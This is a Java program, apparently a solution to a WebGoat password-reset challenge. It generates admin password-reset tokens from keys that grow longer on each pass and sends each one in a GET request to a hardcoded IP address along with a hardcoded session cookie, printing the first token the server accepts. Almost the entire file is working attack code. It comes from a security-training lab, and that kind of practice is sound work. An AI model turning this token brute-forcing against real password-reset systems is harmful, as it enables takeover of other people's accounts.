/******************************************************************************

                            Online Java Compiler.
                Code, Compile, Run and Debug java program online.
Write your code in this editor and press "Run" button to execute it.

*******************************************************************************/
import java.io.BufferedReader;
import java.lang.StringBuffer;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.TimeUnit;
import java.io.InputStream;

public class Main8
{
    private static String FOUND = "NONE";
    // https://www.journaldev.com/7148/java-httpurlconnection-example-java-http-request-get-post
    private static void sendGET(String token) throws IOException {
		URL obj = new URL("http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/" + token);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("GET");
        // https://examples.javacodegeeks.com/core-java/net/urlconnection/send-cookie-with-http-request/
        con.setRequestProperty("Cookie", "JSESSIONID=IjR_vXm0O83oXkF376e5pM7nLxuJ2xk_80h-ryqH");
		int responseCode = con.getResponseCode();
        String res;
        if (responseCode == 418) {
            // res = streamToStr(con.getErrorStream());
            // System.out.println(res);

        } else {
            System.out.println("GET Response Code :: " + responseCode);

            // print result
            res = streamToStr(con.getInputStream());
            System.out.println(res);
            System.out.println(token);
            System.exit(0);
            
        }
      

	}

    private static String streamToStr(InputStream is) throws IOException {
        BufferedReader in = new BufferedReader(new InputStreamReader(is));
        String inputLine;
        StringBuffer response = new StringBuffer();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        return response.toString();
    }

    public static void main(String[] args) {

        String username = "admin";
        String key = "w";
        int i = 0;
        
        while (true) {
            if (i >= 166328) {
                System.out.println("Length = " + i);
                String token = new PasswordResetLink().createPasswordReset(username, key);
                // System.out.println(token);
                try {
                    sendGET(token);
                    // TimeUnit.SECONDS.sleep(1);
                } catch(Exception ex) {
                    System.out.println("Error");
                    // ex.printStackTrace();
                }

                // break;
                
            }
            key = key + "w";
            i++;
        }
        
    }
}
